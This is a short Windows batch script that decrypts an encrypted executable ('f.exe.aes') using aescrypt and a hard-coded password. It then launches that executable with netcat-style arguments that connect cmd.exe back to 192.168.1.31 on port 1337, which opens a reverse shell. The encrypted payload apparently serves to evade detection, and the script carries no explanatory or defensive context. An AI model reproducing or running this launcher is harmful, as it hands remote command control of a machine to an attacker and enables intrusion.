if not exist %cd%\resources f.exe (
	START /WAIT %cd%\resources\aescrypt.exe -p q -d %cd%\resources\f.exe.aes
)
START %cd%\resources\f.exe -e cmd.exe 192.168.1.31 1337
exit
